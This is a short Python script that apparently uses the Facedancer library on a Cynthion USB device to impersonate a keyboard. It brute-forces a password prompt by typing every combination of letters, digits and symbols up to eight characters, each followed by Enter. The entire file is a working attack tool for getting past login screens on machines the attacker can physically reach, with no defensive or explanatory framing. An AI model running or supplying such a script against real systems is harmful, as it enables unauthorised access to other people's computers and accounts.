#!/usr/bin/env python3

# This script is designed to use the Cynthion device to simulate a USB keyboard, and attempt to brute force a password prompt

import asyncio
import itertools

from facedancer import main
from facedancer.devices.keyboard     import USBKeyboardDevice
from facedancer.classes.hid.keyboard import KeyboardModifiers

device = USBKeyboardDevice()

# Example charset, can be modified to include more characters
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?/~`'

# Maximum length of the password to attempt
# Adjust as needed, higher values will take exponentially longer
max_length = 8

# This function will enter an infinite loop where it will attempt to generate and type all possible password combinations
# followed by the Enter key. This example is a very basic brute-force approach and may need to be adjusted based on the target 
# system's requirements.
async def brute_force():

    # Wait for device to connect
    await asyncio.sleep(2)

    for length in range(1, max_length + 1):
        for combo in itertools.product(charset, repeat=length):
            testString = ''.join(combo)

            print("Attempting password: " + testString)

            # Type the generated string followed by Enter (newline)
            await device.type_string(testString + "\n")

main(device, brute_force())
